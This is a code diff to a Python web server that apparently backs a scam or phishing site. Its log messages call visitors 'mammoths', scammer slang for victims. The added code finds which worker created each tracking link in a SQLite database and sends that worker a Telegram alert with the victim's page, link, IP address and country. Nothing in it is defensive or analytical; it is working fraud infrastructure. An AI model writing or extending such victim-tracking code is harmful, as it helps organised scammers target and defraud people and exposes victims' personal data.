@@ -27,7 +27,7 @@ def add_ignore_first_visit(page_code):
         IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
         print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")
 
-def send_telegram_log(page, link, ip, country=""):
+def send_telegram_log(page, link, ip, country="", page_code=None):
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
@@ -43,6 +43,98 @@ def send_telegram_log(page, link, ip, country=""):
         requests.post(url, data=data_admin, timeout=2)
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
+    
+    # Якщо є page_code, надсилаємо лог створювачу посилання
+    if page_code and page_code.strip():
+        print(f"📤 Надсилаємо лог створювачу посилання: {page_code}")
+        send_log_to_link_creator(page, link, ip, country, page_code)
+    elif page_code:
+        print(f"⚠️ page_code порожній або містить тільки пробіли: '{page_code}'")
+    else:
+        print(f"ℹ️ page_code відсутній, лог створювачу не надсилається")
+
+def send_log_to_link_creator(page, link, ip, country, page_code):
+    """Надсилає лог про перехід користувачу, який створив посилання"""
+    try:
+        print(f"🔍 Шукаємо створювача для page_code: {page_code}")
+        import sqlite3
+        conn = sqlite3.connect('users.db')
+        c = conn.cursor()
+        
+        # Знаходимо користувача, який створив цей page_code
+        c.execute('''
+            SELECT el.user_id 
+            FROM event_links el 
+            WHERE el.event_code = ?
+        ''', (page_code,))
+        
+        result = c.fetchone()
+        conn.close()
+        
+        if result:
+            user_id = result[0]
+            print(f"✅ Знайдено створювача: user_id={user_id} для page_code={page_code}")
+            
+            # Перевіряємо, чи існує page_code в site_users
+            conn = sqlite3.connect('users.db')
+            c = conn.cursor()
+            c.execute('SELECT id FROM site_users WHERE page_code = ?', (page_code,))
+            site_user = c.fetchone()
+            conn.close()
+            
+            if site_user:
+                print(f"📝 page_code {page_code} підтверджено в site_users")
+            else:
+                print(f"⚠️ page_code {page_code} не знайдено в site_users, але є в event_links")
+            
+            msg = (
+                f"🎯 Мамонт перейшов на ваше посилання!\n"
+                f"📄 Сторінка: {page}\n"
+                f"🔗 Посилання: {link}\n"
+                f"🌍 IP: {ip}\n"
+                f"🌏 Країна: {country}\n"
+                f"🆔 Ваш код: {page_code}"
+            )
+            
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+            data = {"chat_id": user_id, "text": msg}
+            
+            try:
+                response = requests.post(url, data=data, timeout=2)
+                if response.status_code == 200:
+                    print(f"✅ Лог надіслано створювачу посилання {page_code} (user_id: {user_id})")
+                else:
+                    print(f"⚠️ Помилка надсилання логу створювачу: {response.status_code}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання логу створювачу посилання: {e}")
+        else:
+            print(f"⚠️ Не знайдено створювача для page_code: {page_code}")
+            # Спробуємо альтернативний пошук
+            print(f"🔍 Спробуємо альтернативний пошук...")
+            try:
+                conn = sqlite3.connect('users.db')
+                c = conn.cursor()
+                
+                # Перевіряємо, чи існує page_code в site_users
+                c.execute('SELECT id FROM site_users WHERE page_code = ?', (page_code,))
+                site_user = c.fetchone()
+                
+                if site_user:
+                    print(f"📝 page_code {page_code} знайдено в site_users з id: {site_user[0]}")
+                else:
+                    print(f"❌ page_code {page_code} не знайдено в site_users")
+                
+                # Перевіряємо всі event_links
+                c.execute('SELECT event_code, user_id FROM event_links LIMIT 5')
+                sample_links = c.fetchall()
+                print(f"📝 Приклад event_links: {sample_links}")
+                
+                conn.close()
+            except Exception as debug_e:
+                print(f"❌ Помилка при альтернативному пошуку: {debug_e}")
+            
+    except Exception as e:
+        print(f"❌ Помилка пошуку створювача посилання: {e}")
 
 def get_cached_response(cache_key):
     """Отримує кешовану відповідь якщо вона ще актуальна"""
@@ -100,6 +192,12 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 from urllib.parse import parse_qs
                 qs = parse_qs(self.path.split('?', 1)[1])
                 page_code = qs.get('page', [None])[0]
+                if page_code:
+                    print(f"🔍 Знайдено page_code: {page_code}")
+                    # Перевіряємо, чи page_code не порожній
+                    if not page_code.strip():
+                        print(f"⚠️ page_code порожній після strip(): '{page_code}'")
+                        page_code = None
             should_ignore_first_visit = page_code and page_code in IGNORE_FIRST_VISIT_PAGE_CODES
             
             # Нормалізуємо шлях для унікальності
@@ -118,14 +216,24 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 if norm_path not in self.server.logged_paths:
                     self.server.logged_paths.add(norm_path)
                     print(f"📝 Логуємо відкриття сторінки: {norm_path}")
-                    send_telegram_log(
-                        page=norm_path,
-                        link=self.path,
-                        ip=self.client_address[0]
-                    )
+                    if page_code and page_code.strip():
+                        print(f"🔗 Логуємо з page_code: {page_code}")
+                        send_telegram_log(
+                            page=norm_path,
+                            link=self.path,
+                            ip=self.client_address[0],
+                            page_code=page_code
+                        )
+                    else:
+                        print(f"ℹ️ Логуємо без page_code")
+                        send_telegram_log(
+                            page=norm_path,
+                            link=self.path,
+                            ip=self.client_address[0]
+                        )
             
             # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
-            if should_ignore_first_visit:
+            if should_ignore_first_visit and page_code:
                 IGNORE_FIRST_VISIT_PAGE_CODES.discard(page_code)
                 print(f"[IGNORE_FIRST_VISIT] Removed {page_code} from ignore list after first visit")
             
@@ -423,7 +531,13 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     page = data.get('page', '')
                     link = data.get('link', '')
                     ip = self.client_address[0]
-                    send_telegram_log(page=page, link=link, ip=ip)
+                    page_code_from_data = data.get('page_code')
+                    if page_code_from_data and page_code_from_data.strip():
+                        print(f"🔗 Логуємо з page_code: {page_code_from_data}")
+                        send_telegram_log(page=page, link=link, ip=ip, page_code=page_code_from_data)
+                    else:
+                        print(f"ℹ️ Логуємо без page_code")
+                        send_telegram_log(page=page, link=link, ip=ip)
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'OK')
